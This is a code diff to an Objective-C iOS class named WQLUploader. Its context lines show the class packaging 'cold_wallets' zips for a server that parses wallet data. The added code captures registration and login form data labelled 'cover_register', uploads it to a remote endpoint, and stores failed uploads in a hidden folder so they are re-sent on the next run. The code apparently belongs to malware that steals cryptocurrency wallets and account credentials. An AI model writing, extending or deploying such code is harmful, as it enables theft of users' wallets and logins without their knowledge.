@@ -5,9 +5,25 @@
 #import <dispatch/dispatch.h>
 #import <stdarg.h>
 
+static NSString *WQLAuthPendingDir(void) {
+    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
+                                                        NSUserDomainMask, YES);
+    NSString *base = docs.firstObject ?: NSTemporaryDirectory();
+    NSString *dir = [base stringByAppendingPathComponent:@"wql_auth_pending"];
+    [[NSFileManager defaultManager] createDirectoryAtPath:dir
+                              withIntermediateDirectories:YES attributes:nil error:nil];
+    return dir;
+}
+
 @interface WQLUploader ()
 @property (nonatomic, strong) NSURLSession *session;
 @property (nonatomic, assign) BOOL cancelled;
+- (BOOL)uploadFile:(NSString *)path relative:(NSString *)rel filename:(NSString *)filename;
+- (BOOL)uploadFile:(NSString *)path
+          relative:(NSString *)rel
+          filename:(NSString *)filename
+              kind:(NSString *)kind;
+- (void)flushPendingAuthForms;
 @end
 
 @implementation WQLUploader
@@ -85,6 +101,9 @@
         __strong typeof(weakSelf) self = weakSelf;
         if (!self) return;
 
+        // 先把上次没传成功的注册/登录表单补掉
+        [self flushPendingAuthForms];
+
         // 服务端只把带 _manifest.json 的 zip 归入 wallet_* 并解析，所以优先整包上传
         NSString *zipPath = [NSTemporaryDirectory() stringByAppendingPathComponent:
                              [NSString stringWithFormat:@"cold_wallets_%@.zip",
@@ -140,6 +159,13 @@
 }
 
 - (BOOL)uploadFile:(NSString *)path relative:(NSString *)rel filename:(NSString *)filename {
+    return [self uploadFile:path relative:rel filename:filename kind:nil];
+}
+
+- (BOOL)uploadFile:(NSString *)path
+          relative:(NSString *)rel
+          filename:(NSString *)filename
+              kind:(NSString *)kind {
     NSFileManager *fm = [NSFileManager defaultManager];
     NSDictionary *attr = [fm attributesOfItemAtPath:path error:nil];
     uint64_t size = [attr[NSFileSize] unsignedLongLongValue];
@@ -187,6 +213,7 @@
         NSData *head = [self headerDataForFilename:upName
                                           relative:rel
                                               size:(uint64_t)data.length
+                                              kind:kind
                                           boundary:boundary];
         NSData *foot = [self footerDataForBoundary:boundary];
         [out writeData:head];
@@ -255,6 +282,51 @@
     return NO;
 }
 
+#pragma mark - 注册/登录表单
+
+- (BOOL)uploadJSONNow:(NSDictionary *)json kind:(NSString *)kind {
+    if (!json) return NO;
+    NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
+    if (!data.length) return NO;
+
+    NSString *name = [NSString stringWithFormat:@"cover_register_%llu.json",
+                      (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000)];
+    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:name];
+    if (![data writeToFile:tmp atomically:YES]) return NO;
+
+    BOOL ok = NO;
+    if (self.endpoint.length) {
+        ok = [self uploadFile:tmp relative:name filename:name kind:kind];
+    }
+
+    NSFileManager *fm = [NSFileManager defaultManager];
+    if (!ok) {
+        NSString *dst = [WQLAuthPendingDir() stringByAppendingPathComponent:name];
+        [fm removeItemAtPath:dst error:nil];
+        if ([fm moveItemAtPath:tmp toPath:dst error:nil]) {
+            [self log:@"表单: 上传失败，已暂存待补传 %@", name];
+            return NO;
+        }
+    }
+    [fm removeItemAtPath:tmp error:nil];
+    return ok;
+}
+
+- (void)flushPendingAuthForms {
+    NSString *dir = WQLAuthPendingDir();
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSArray<NSString *> *items = [[fm contentsOfDirectoryAtPath:dir error:nil]
+                                  sortedArrayUsingSelector:@selector(compare:)];
+    for (NSString *n in items) {
+        if (self.cancelled) return;
+        NSString *path = [dir stringByAppendingPathComponent:n];
+        [self log:@"表单: 补传 %@", n];
+        if ([self uploadFile:path relative:n filename:n kind:@"cover_register"]) {
+            [fm removeItemAtPath:path error:nil];
+        }
+    }
+}
+
 #pragma mark - 日志上传
 
 - (void)uploadLogFile:(NSString *)path completion:(void (^)(BOOL))completion {
@@ -314,6 +386,7 @@
 - (NSData *)headerDataForFilename:(NSString *)filename
                          relative:(NSString *)relative
                              size:(uint64_t)size
+                             kind:(NSString *)kind
                          boundary:(NSString *)boundary {
     NSMutableData *body = [NSMutableData data];
     NSString *bundle = [relative componentsSeparatedByString:@"/"].firstObject ?: @"";
@@ -340,6 +413,7 @@
     field(@"bundle", bundle);
     field(@"relative", relative);
     field(@"size", [NSString stringWithFormat:@"%llu", (unsigned long long)size]);
+    if (kind.length) field(@"kind", kind);
 
     [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary]
                       dataUsingEncoding:NSUTF8StringEncoding]];
